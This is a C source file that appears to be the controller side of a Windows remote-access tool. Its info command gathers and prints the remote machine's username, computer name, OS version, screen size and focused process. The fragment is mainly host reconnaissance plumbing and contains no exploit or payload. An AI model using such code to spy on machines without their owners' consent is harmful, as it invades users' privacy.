#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "server/serv_cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"

#define SERV_INFO_USERNAME 0x1
#define SERV_INFO_COMPUTER 0x2
#define SERV_INFO_VERSION 0x3
#define SERV_INFO_X 0x4
#define SERV_INFO_Y 0x5
#define SERV_INFO_FOCUS_PID 0x6
#define SERV_INFO_FOCUS_EXE 0x7

#define SERV_INFO_COUNT 0x7//0x8
#define SERV_INFO_FAILED 0x0F

void serv_INFO_version(uint8* str)
{
	OSVERSIONINFO* osver = (OSVERSIONINFO*)str;

	if(osver->dwMajorVersion >= 6 && osver->dwMinorVersion >= 2)
	{
		printf("Windows 8/10\n");
		return;
	}

	if(osver->dwMajorVersion == 6 && osver->dwMinorVersion == 1)
	{
		printf("Windows 7\n");
		return;
	}

	if(osver->dwMajorVersion == 6 && osver->dwMinorVersion == 0)
	{
		printf("Windows Vista\n");
		return;
	}

	if(osver->dwMajorVersion == 5)
	{
		if(osver->dwMinorVersion == 0)
		{
			printf("Windows 2000\n");
			return;
		}else if(osver->dwMinorVersion >= 1){
			printf("Windows XP\n");
			return;
		}
	}

	printf("%d.%d\n", (int)osver->dwMajorVersion, (int)osver->dwMinorVersion);
}

int serv_INFO(void)
{
	int rv = net_SendEmptyCmd(SERV_CMDS_INFO);
	
	if(rv < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	int i;
	uint8 *rmsg;

	for(i = 0; i != SERV_INFO_COUNT; i++)
	{
		rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

		if(rv < 1)
		{
			net_PrintLastError();
	
			return SERV_CMDS_BREAK;
		}

		switch(rmsg[0])
		{
			case SERV_INFO_USERNAME:
				LOG(LOG_TABLE, "User: ");
			
				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					printf("%s\n", rmsg + 2);
				}

				break;
			case SERV_INFO_COMPUTER:
				LOG(LOG_TABLE, "Computer: ");
			
				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					printf("%s\n", rmsg + 2);
				}
				
				break;
			case SERV_INFO_VERSION:
				LOG(LOG_TABLE, "Version: ");

				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					serv_INFO_version(rmsg + 2);
				}
				
				break;
			case SERV_INFO_X:
				LOG(LOG_TABLE, "Sceen W: ");

				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					uint32 val = 0x0;
					memcpy(&val, rmsg + 2, sizeof(val));
					printf("%d\n", val);
				}
				
				break;
			case SERV_INFO_Y:
				LOG(LOG_TABLE, "Sceen H: ");

				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					uint32 val = 0x0;
					memcpy(&val, rmsg + 2, sizeof(val));
					printf("%d\n", val);
				}
				
				break;
			case SERV_INFO_FOCUS_PID:
				LOG(LOG_TABLE, "Focus PID: ");

				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					uint32 val = 0x0;
					memcpy(&val, rmsg + 2, sizeof(val));
					printf("%d\n", val);
				}
				
				break;
			case SERV_INFO_FOCUS_EXE:
				LOG(LOG_TABLE, "Focus exe: ");
			
				if(rmsg[1] == SERV_INFO_FAILED)
				{
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN\n");
					LOG_SetColor(LOG_COLOR_TEXT);
				}else{
					printf("%s\n", rmsg + 2);
				}
				
				break;
			default:
				break;
		}

		free(rmsg);

		if(net_SendEmptyCmd(SERV_CMDS_INFO) < 1)
		{
			net_PrintLastError();

			return SERV_CMDS_BREAK;
		}
	}

	return SERV_CMDS_GOOD;
}
